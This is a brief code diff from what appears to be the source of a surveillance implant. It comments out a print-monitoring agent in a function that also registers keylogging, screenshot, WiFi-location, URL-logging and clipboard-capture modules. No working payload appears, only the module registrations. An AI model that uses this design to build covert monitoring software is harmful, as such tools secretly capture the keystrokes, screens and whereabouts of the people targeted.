@@ -413,7 +413,7 @@ void InitAgents()
 	PM_KeyLogRegister();
 	PM_SnapShotRegister();
 	PM_WiFiLocationRegister();
-	PM_PrintAgentRegister();
+	//PM_PrintAgentRegister();
 	PM_CrisisAgentRegister();
 	PM_UrlLogRegister();
 	PM_ClipBoardRegister();
